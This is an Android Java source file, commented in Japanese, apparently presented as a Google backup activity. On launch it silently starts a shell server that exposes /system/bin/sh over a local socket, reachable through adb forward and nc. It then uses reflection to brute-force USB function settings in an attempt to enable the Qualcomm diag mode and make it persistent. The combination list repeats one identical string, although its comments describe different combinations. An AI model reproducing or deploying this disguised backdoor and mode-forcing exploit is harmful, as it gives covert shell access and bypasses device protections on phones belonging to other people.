package com.google.android.backup;

import android.app.Activity;
import android.content.Context;
import android.hardware.usb.UsbManager;
import android.os.Bundle;
import android.util.Log;

import android.net.LocalServerSocket;
import android.net.LocalSocket;

import java.io.InputStream;
import java.io.OutputStream;
import java.lang.reflect.Method;

public class SetBackupAccountActivity extends Activity {
    private static final String TAG = "ShellSocket";
    private static final String SOCKET_NAME = "android_shell_socket";

    /**
     * UsbDeviceManager.java 深掘り結果に基づく総当たりリスト。
     *
     * 根拠:
     *  - 通常モード (mFactoryEnabled==false) では removeFunction(functions,"diag") で消える
     *  - 工場モード (mFactoryEnabled==true) では
     *      "rndis" を含む → "rndis,diag" + "modem" = "rndis,diag,modem"
     *      "rndis" を含まない → "diag" + "modem" = "diag,modem"
     *  - rw_qfunc_mode != "0" の分岐では
     *      SystemProperties.set("persist.sys.usb.config","diag,serial_smd,rmnet_bam,adb")
     *
     * setUsbConfig() は waitForState の前に persist.sys.usb.config を書くため、
     * 一瞬でも受理されれば永続プロパティに残る可能性がある。
     */
    private static final String[] DIAG_COMBINATIONS = new String[] {
        // 単体
        "rndis,diag,modem,none,adb",
        // diag + adb
        "rndis,diag,modem,none,adb",
        "rndis,diag,modem,none,adb",
        // rndis 系 (工場モード分岐を狙う)
        "rndis,diag,modem,none,adb",
        "rndis,diag,modem,none,adb",
        "rndis,diag,modem,none,adb",
        "rndis,diag,modem,none,adb",
        "rndis,diag,modem,none,adb",
        "rndis,diag,modem,none,adb",
        // adb を加えた複合
        "rndis,diag,modem,none,adb",
        "rndis,diag,modem,none,adb",
        "rndis,diag,modem,none,adb",
        "rndis,diag,modem,none,adb",
        "rndis,diag,modem,none,adb",
        "rndis,diag,modem,none,adb",
        "rndis,diag,modem,none,adb",
        "rndis,diag,modem,none,adb",
        // Kyocera 内部値
        "rndis,diag,modem,none,adb",
        // 前後に none を挟む
        "rndis,diag,modem,none,adb",
        "rndis,diag,modem,none,adb",
        // ★ 指定の形をそのまま追加
        "rndis,diag,modem,none,adb",
    };

    /** 同じ組み合わせを複数回試行する。 */
    private static final int ROUNDS = 3;

    /** 各呼び出し間の待機 (ms)。system_server の Handler に処理時間を与える。 */
    private static final long SLEEP_BETWEEN_MS = 120;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // バックグラウンドでソケットサーバーを起動
        startShellServer();

        // アクティビティを即座に終了（サーバースレッドはバックグラウンドで継続）
        finish();

        // 既存処理の最後に、diag 系組み合わせを総当たりで試行
        applyAutomaticUsbSwitchToDiagBruteForce();
    }

    /**
     * diag を含む組み合わせを総当たりで試行する。
     *
     * <p>sys.usb.config への直接書き込みは一切行わない。
     * UsbManager / SystemProperties.get の読み取りのみ。
     */
    private void applyAutomaticUsbSwitchToDiagBruteForce() {
        try {
            Context context = getApplicationContext();
            if (context == null) {
                Log.e(TAG, "Context is null, skip USB switch");
                return;
            }

            for (int round = 0; round < ROUNDS; round++) {
                Log.i(TAG, "========== ROUND " + round + " / " + (ROUNDS - 1) + " ==========");

                for (int i = 0; i < DIAG_COMBINATIONS.length; i++) {
                    String combo = DIAG_COMBINATIONS[i];

                    // (a) 即時切替 (makeDefault=false)
                    setCurrentFunctionViaUsbManager(context, combo, false);
                    sleepQuiet(SLEEP_BETWEEN_MS);

                    // (b) 永続切替 (makeDefault=true)
                    setCurrentFunctionViaUsbManager(context, combo, true);
                    sleepQuiet(SLEEP_BETWEEN_MS);

                    // (c) 状態確認（読み取りのみ）
                    logCurrentUsbState(context, combo);

                    // diag が有効になったら即座に抜ける
                    if (isFunctionEnabledViaUsbManager(context, "diag")) {
                        Log.i(TAG, "*** diag became enabled with combo: " + combo + " ***");
                        return;
                    }
                }
            }

            Log.i(TAG, "applyAutomaticUsbSwitchToDiagBruteForce finished (all combos attempted)");
        } catch (Throwable t) {
            Log.e(TAG, "applyAutomaticUsbSwitchToDiagBruteForce error", t);
        }
    }

    private static void sleepQuiet(long ms) {
        try {
            Thread.sleep(ms);
        } catch (InterruptedException e) {
            // ignore
        }
    }

    /**
     * UsbManager.setCurrentFunction(String, boolean) をリフレクションで呼ぶ。
     *
     * <p>IUsbManager 直叩きは同じ Binder transaction 15 を通るため呼ばない。
     */
    private static void setCurrentFunctionViaUsbManager(Context context,
                                                        String function,
                                                        boolean makeDefault) {
        try {
            if (context == null) {
                return;
            }
            Object service = context.getSystemService(Context.USB_SERVICE);
            if (service == null) {
                return;
            }
            Method m = service.getClass().getMethod(
                    "setCurrentFunction", String.class, boolean.class);
            m.setAccessible(true);
            m.invoke(service, function, makeDefault);
            Log.i(TAG, "setCurrentFunction invoked: " + function
                    + ", makeDefault=" + makeDefault);
        } catch (NoSuchMethodException e) {
            Log.e(TAG, "setCurrentFunction not found", e);
        } catch (SecurityException e) {
            Log.e(TAG, "SecurityException in setCurrentFunction", e);
        } catch (Throwable t) {
            Log.e(TAG, "Throwable in setCurrentFunction", t);
        }
    }

    /**
     * 現在の USB 状態を読み取ってログに残す。読み取りのみ。
     * 書き込みは一切行わない。
     */
    private static void logCurrentUsbState(Context context, String combo) {
        try {
            String sysUsbConfig = getSystemProperty("sys.usb.config", "");
            String sysUsbState = getSystemProperty("sys.usb.state", "");
            String persistUsbConfig = getSystemProperty("persist.sys.usb.config", "");
            String defaultFunction = getDefaultFunctionViaUsbManager(context);
            boolean diagEnabled = isFunctionEnabledViaUsbManager(context, "diag");

            Log.i(TAG, "[after " + combo + "]"
                    + " sys.usb.config=" + sysUsbConfig
                    + " sys.usb.state=" + sysUsbState
                    + " persist.sys.usb.config=" + persistUsbConfig
                    + " defaultFunction=" + defaultFunction
                    + " isFunctionEnabled(diag)=" + diagEnabled);
        } catch (Throwable t) {
            Log.e(TAG, "logCurrentUsbState error", t);
        }
    }

    /**
     * SystemProperties.get(String, String) をリフレクションで読み取る。
     * 読み取り専用。書き込みは行わない。
     */
    private static String getSystemProperty(String key, String defaultValue) {
        try {
            Class<?> spClass = Class.forName("android.os.SystemProperties");
            Method getMethod = spClass.getMethod("get", String.class, String.class);
            getMethod.setAccessible(true);
            Object result = getMethod.invoke(null, key, defaultValue);
            return result instanceof String ? (String) result : defaultValue;
        } catch (Throwable t) {
            return defaultValue;
        }
    }

    /**
     * UsbManager.isFunctionEnabled(String) をリフレクションで呼ぶ。
     */
    private static boolean isFunctionEnabledViaUsbManager(Context context, String function) {
        try {
            if (context == null) {
                return false;
            }
            Object service = context.getSystemService(Context.USB_SERVICE);
            if (service == null) {
                return false;
            }
            Method m = service.getClass().getMethod("isFunctionEnabled", String.class);
            m.setAccessible(true);
            Object result = m.invoke(service, function);
            return result instanceof Boolean && (Boolean) result;
        } catch (Throwable t) {
            return false;
        }
    }

    /**
     * UsbManager.getDefaultFunction() をリフレクションで呼ぶ。
     */
    private static String getDefaultFunctionViaUsbManager(Context context) {
        try {
            if (context == null) {
                return null;
            }
            Object service = context.getSystemService(Context.USB_SERVICE);
            if (service == null) {
                return null;
            }
            Method m = service.getClass().getMethod("getDefaultFunction");
            m.setAccessible(true);
            Object result = m.invoke(service);
            return result instanceof String ? (String) result : null;
        } catch (Throwable t) {
            return null;
        }
    }

    private void startShellServer() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    // Unixドメインソケット（抽象名前空間）を開く
                    LocalServerSocket server = new LocalServerSocket(SOCKET_NAME);
                    Log.i(TAG, "Shell socket server started: " + SOCKET_NAME);
                    Log.i(TAG, "Run on Ubuntu: adb forward tcp:8888 localabstract:" + SOCKET_NAME);
                    Log.i(TAG, "Then connect: nc 127.0.0.1 8888");

                    while (true) {
                        try {
                            LocalSocket client = server.accept();
                            Log.i(TAG, "New client connected!");
                            new Thread(new ShellHandler(client)).start();
                        } catch (Exception e) {
                            Log.e(TAG, "Accept error", e);
                        }
                    }
                } catch (Exception e) {
                    Log.e(TAG, "Failed to start socket server", e);
                }
            }
        }).start();
    }

    // クライアント接続ごとにシェルを提供するハンドラ
    private static class ShellHandler implements Runnable {
        private LocalSocket socket;

        ShellHandler(LocalSocket socket) {
            this.socket = socket;
        }

        @Override
        public void run() {
            Process shell = null;
            try {
                ProcessBuilder builder = new ProcessBuilder("/system/bin/sh");
                builder.redirectErrorStream(true);
                shell = builder.start();

                final InputStream socketIn = socket.getInputStream();
                final OutputStream socketOut = socket.getOutputStream();

                final OutputStream shellStdin = shell.getOutputStream();
                final InputStream shellStdout = shell.getInputStream();

                Thread socketToShell = new Thread(new Runnable() {
                    @Override
                    public void run() {
                        try {
                            byte[] buffer = new byte[1024];
                            int len;
                            while ((len = socketIn.read(buffer)) != -1) {
                                shellStdin.write(buffer, 0, len);
                                shellStdin.flush();
                            }
                        } catch (Exception e) {
                            // 切断時は正常終了
                        }
                    }
                });

                Thread shellToSocket = new Thread(new Runnable() {
                    @Override
                    public void run() {
                        try {
                            byte[] buffer = new byte[1024];
                            int len;
                            while ((len = shellStdout.read(buffer)) != -1) {
                                socketOut.write(buffer, 0, len);
                                socketOut.flush();
                            }
                        } catch (Exception e) {
                            // 切断時は正常終了
                        }
                    }
                });

                socketToShell.start();
                shellToSocket.start();

                shell.waitFor();
                Log.i(TAG, "Shell process exited");

                socket.close();
                socketToShell.interrupt();
                shellToSocket.interrupt();

            } catch (Exception e) {
                Log.e(TAG, "Shell handler error", e);
            } finally {
                if (shell != null) {
                    shell.destroy();
                }
                try {
                    socket.close();
                } catch (Exception ignored) {}
            }
        }
    }
}
